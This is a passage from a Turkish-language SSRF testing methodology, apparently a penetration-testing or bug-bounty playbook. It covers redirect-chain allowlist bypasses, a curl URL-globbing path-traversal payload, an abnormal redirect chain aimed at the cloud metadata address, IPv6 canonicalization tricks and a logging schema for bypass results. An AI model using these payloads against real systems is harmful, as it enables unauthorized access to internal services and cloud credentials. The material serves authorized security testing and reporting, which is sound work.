kullandığı tespit edildiğinde (§8.1 koruma hipotez listesi) anlamlıdır
— blacklist ağırlıklı bir hipotezde zaten doğrudan internal IP
denenebilir, redirect zincirine gerek yoktur (redirect zinciri burada
gereksiz bir karmaşıklık olur).

**Kritik ek test — "validate-once" mi "validate-every-hop" mu?**
Bir allowlist kontrolünün redirect zincirine karşı davranışı iki
farklı model izleyebilir, ve bu ayrım B10'un başarı ihtimalini
doğrudan belirler:

- **validate-before-first-request (TOCTOU riski taşır):** Uygulama
  yalnızca **kullanıcının verdiği ilk URL'i** allowlist'e karşı
  kontrol eder; HTTP client bir redirect aldığında **yeniden
  doğrulama yapmadan** onu takip eder. B10 bu modelde **çalışır**.
- **validate-every-hop (B10'u büyük ölçüde etkisiz kılar):** HTTP
  client, redirect zincirindeki **her yeni hedefi** de aynı
  allowlist/blacklist kontrolünden geçirir (bazı güvenlik-bilinçli
  HTTP client wrapper'ları — örn. bazı SSRF-koruma kütüphaneleri —
  bunu varsayılan yapar). Bu durumda B10 doğrudan başarısız olur; bu
  **B10'u tamamen elemez** ama sonraki adımı değiştirir — artık hedef,
  redirect'in **kendisini** değil, ara hedefin (allowlist'teki
  sunucunun) **DNS/IP seviyesinde** ele geçirilmesi (B6/B7) veya
  parser-seviyesi bir farkla ilk isteğin **kendisinde** zaten iki
  farklı hedef göstermesi (B8/B9) olmalıdır.

**Bu ayrımı test etme:** Kendi sunucunda iki farklı redirect
senaryosu kur: (1) allowlist'teki bir domain'e → **zararsız** bir
harici IP'ye yönlendiren bir redirect, (2) aynı allowlist domain'ine
→ **internal** bir IP'ye yönlendiren bir redirect. İkisi de kabul
ediliyorsa validate-once modeli; yalnızca (1) kabul edilip (2)
reddediliyorsa (veya farklı bir hata veriyorsa) validate-every-hop
modeli aktiftir — bu fingerprint sonucu `redirect_revalidation:
true/false` olarak §8.2.6'daki canonical resolution kaydına
eklenmelidir.

## 8.2.5 İleri Seviye Bypass Teknikleri — curl Globbing ve Anormal Redirect Zinciri

**curl URL globbing ile path/protokol obfuscation (B20):** Hedefin
outbound isteği curl (veya libcurl tabanlı bir kütüphane) ile
attığı fingerprint edildiyse (§7), curl'ün "URL globbing" özelliği
(brace-expansion `{a,b,c}` ve range-expansion `[1-10]`) bir WAF/
pattern-matching filtresinin **tanımadığı** ama curl'ün **doğru
şekilde genişlettiği** bir sözdizimiyle path traversal karakterlerini
gizlemek için kullanılabilir:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
Bu payload'da `{.}.` dizisi curl tarafından `..` olarak genişletilir
— literal `../../` string'ini arayan bir path-traversal filtresi bu
deseni tanımaz, ama curl aynı sonuca ulaşır. Bu teknik yalnızca
outbound HTTP client'ın **gerçekten** curl/libcurl olduğu
fingerprint edildiğinde denenmelidir (aksi halde hedefin URL parser'ı
globbing'i desteklemez, payload literal olarak başarısız olur).

**Anormal/"tuhaf" redirect status code zinciri (B21) — client
library'nin kendi hata-modu zaafını istismar etme:** Standart
301/302/307/308 dışındaki, HTTP spesifikasyonunda daha az kullanılan
3xx kodlarının (305, 306 [ayrılmış/kullanılmayan], 309, 310 gibi resmi
olmayan/uç kodlar dahil) **art arda** bir redirect zincirinde
gönderilmesi, bazı yüksek-seviye HTTP client wrapper kütüphanelerini
(özellikle "N tane olağandışı redirect gördüysem bir şeyler ters
gidiyor, hata ayıklama moduna geç ve response'u sorgulamadan geçir"
tarzı bir savunmacı programlama deseni içeren wrapper'ları) normal
güvenlik kontrol akışının **dışına** çıkarabilir — bu "hata modu"na
girdikten sonra wrapper, sıradaki bir 302'nin hedefini (örn. cloud
metadata IP'sini) artık doğrulamadan takip edebilir. Somut PoC deseni
(kendi kontrolündeki bir sunucuda):
```
/start  → 302 → /redir?count=1
/redir  → count'u 1 artırarak weird_status (302+count) ile kendine
          yönlendirmeye devam eder (305, 306, 307, 308, 309, 310...)
          N. (örn. 5.) turdan sonra nihai hedefe (örn.
          http://169.254.169.254/...) standart bir 302 ile yönlendirir
```
**Epistemik durum düzeltmesi — bu teknik "yaygın olarak kanıtlanmış"
değil, teorik/araştırma niteliklidir:** Bu tekniğin gerçek dünyada
tekrarlanabilir, geniş çaplı doğrulanmış bir kayıt geçmişi yoktur —
belirli, özel yapılandırılmış HTTP client wrapper'larında (redirect'i
manuel doğrulayan, kendi hop-sayacını tutan) **teorik olarak** mümkün
olduğu gösterilmiştir, "genel olarak etkili bir bypass" değildir.
**Ek netleştirme:** `309`/`310` gibi kodlar HTTP spesifikasyonunun
**standart bir parçası değildir** ve hiçbir client'ın bunları
"normal" bir redirect olarak tanıyacağı varsayılmamalıdır — bu
teknik yalnızca hedefte **gerçekten gözlemlenen, standart-dışı bir
custom redirect-handling davranışı** varsa araştırılmaya değerdir,
"305-310 aralığı genel olarak desteklenir" gibi bir varsayımla
denenmez.
**Varsayılan olarak ÇALIŞTIRILMAZ (default-off) — yalnızca aşağıdaki
önkoşulların TÜMÜ sağlandığında denenmelidir:**
1. Standart redirect zinciri (B10, §8.2.4) ve status code seçimi
   (307/308) denendiği halde **negatif** dönmüş olmalı, VE
2. Hedefte **özel/custom bir HTTP client wrapper** kullanıldığına
   dair bir fingerprint sinyali bulunmalı (örn. hata mesajlarında
   özel bir kütüphane adı, veya standart client'ların göstermeyeceği
   bir redirect-handling davranışı gözlemlenmiş olmalı), VE
3. Hedefin allowlist/blacklist koruması **redirect'i tekrar
   doğrulayan** (validate-every-hop, §8.2.4) türden olduğu tespit
   edilmiş olmalı — yalnızca bu tür bir korumaya karşı teorik olarak
   bir bypass fırsatı sunar.
Bu üç koşul sağlanmadan bu teknik denenmemelidir — düşük başarı
ihtimali + görece yüksek request maliyeti kombinasyonu, request
bütçesini (§10.6) daha değerli tekniklere ayırmayı gerektirir.

## 8.2.6 Canonical Target Resolution Model — Bypass Sonuçlarını Doğru Yorumlamak İçin Zorunlu Kayıt

Bir payload'ın "çalıştığı" veya "çalışmadığı" sonucu, tek başına
yeterli bir kayıt değildir — bypass denemelerinin **neden** işe
yaradığını (veya yaramadığını) doğru yorumlayabilmek için, her probe'un
ham girdisinden nihai bağlantı hedefine kadar geçirdiği **her
dönüşüm aşamasının** ayrı ayrı not edilmesi gerekir. Bu, §8.2.3'teki
parser confusion analizinin sistematik hale getirilmiş halidir:

```
raw_input            (payload'ın ham, gönderildiği hali)
  ↓
app_decode           (uygulamanın kendi decode/unescape adımı, varsa)
  ↓
url_parse            (şema, host, port, path, query, fragment ayrımı)
  ↓
hostname_extraction  (parser'ın "host" olarak neyi seçtiği — B8/B9'daki
                       userinfo/backslash confusion'ların tam olarak
                       burada gözlemlenmesi gerekir)
  ↓
idna_normalization   (IDN/punycode dönüşümü varsa — B24 ile ilgili)
  ↓
dns_resolution       (çözümlenen IP(ler) — birden fazla IP dönebilir,
                       hangisinin kullanıldığı önemli; IPv4 ve IPv6
                       kaydı FARKLI dönebilir, ikisi ayrı not edilmeli)
  ↓
ipv6_canonicalization (yalnızca IPv6/IPv4-mapped adresler için ayrı bir
                       karar noktası — bkz. aşağıdaki not)
  ↓
ip_normalization     (B1-B5/B17-B19'daki encoding'lerin son çözümü —
                       "sunucu bu IP'yi nasıl normalize etti")
  ↓
connection           (gerçek TCP bağlantısının kurulduğu IP:port —
                       IPv4 mi IPv6 mı kullanıldığı, "dual-stack"
                       bir hedefte hangisinin tercih edildiği önemli)
  ↓
redirect_chain       (varsa, her hop için bu zincirin TAMAMI ayrı
                       kaydedilmeli — bkz. aşağıdaki revalidation notu)
  ↓
final_target         (en sonunda gerçekten temas edilen adres)
```

**IPv6 canonicalization — neden ayrı bir karar noktası:** Bir IPv6
adresi (`::ffff:127.0.0.1`, `[::1]`, `[::]` gibi) validator'a
ulaştığında, validator'ın bunu **hangi kanonik forma** çevirdiği
(tam açılmış form mu, kısaltılmış mı, IPv4-mapped'i IPv4'e mi
indirgiyor mu) ile **socket katmanının** hangi adrese fiilen
bağlandığı **farklı olabilir** — bir blacklist validator'ı yalnızca
IPv4 formatını (`127.0.0.1`) tanıyorsa ama socket katmanı
`::ffff:127.0.0.1`'i sorunsuz `127.0.0.1`'e bağlıyorsa, bu iki
katman arasındaki canonicalization farkı doğrudan bir bypass
noktasıdır (B5/B26 bu farkı hedefler). Bu nedenle IPv6 içeren her
probe için validator'ın davranışı (kabul/red) ile gerçek bağlantının
hedefi ayrı ayrı kaydedilmelidir — "kabul edildi" tek başına
"bu adrese bağlanıldı" anlamına gelmez.

**Pratik kayıt şablonu — her confirmation denemesi için:**

| Alan | Açıklama |
|---|---|
| `raw_url` | Gönderilen tam payload |
| `parsed_scheme` / `parsed_host` / `parsed_port` | Uygulamanın (biliniyorsa, hata mesajından/davranışından çıkarılan) URL parse sonucu |
| `normalized_host` | IDNA/encoding sonrası normalize edilmiş host |
| `resolved_ips` | DNS çözümlemesi sonucu dönen IP(ler) — IPv4/IPv6 ayrı belirtilmeli |
| `ipv6_canonical_form` | Yalnızca IPv6/IPv4-mapped adresler için — validator'ın kabul ettiği form ile gerçek bağlantı hedefinin aynı olup olmadığı |
| `redirect_chain` | Varsa, sırayla her redirect hop'unun hedefi |
| `redirect_revalidation` | true/false/unknown — §8.2.4'teki testle belirlenen, redirect hedeflerinin de allowlist/blacklist'ten geçip geçmediği |
| `final_ip` / `final_url` | Nihai olarak temas edilen adres |

**Bu model neden önemli — somut fayda:** Bir IP-encoding bypass'ı
(örn. B3 hex encoding) "işe yaradı" göründüğünde, bu bilgi tek
başına **hangi katmanın** aşıldığını söylemez — `ip_normalization`
aşamasının blacklist kontrolünden **önce mi sonra mı** çalıştığını
bilmeden, aynı bypass'ın başka bir endpoint'te neden işe yaramadığını
(veya yarayacağını) tahmin etmek zordur. Bu tabloyu doldurmak, özellikle
birden fazla aday üzerinde çalışırken **hangi bypass'ın hangi
hedefte işe yaradığını sistematik olarak transfer edebilmeyi**
sağlar — aynı hedefteki başka bir endpoint muhtemelen aynı parser/
normalization zincirini kullanıyordur.

**Kullanım kuralı:** Bu, her tekil probe için ayrıntılı bir form
doldurmak anlamına gelmez — yalnızca **confirmed/probable** bir
sonuç elde edildiğinde, o probe'un tam zincirini geriye dönük olarak
(mümkün olduğunca, gözlemlenebilen kısmıyla) bu şemaya göre
kaydetmek yeterlidir; bu da §14.1 raporlama şablonundaki
"reproduction adımları" bölümünü doğrudan besler.
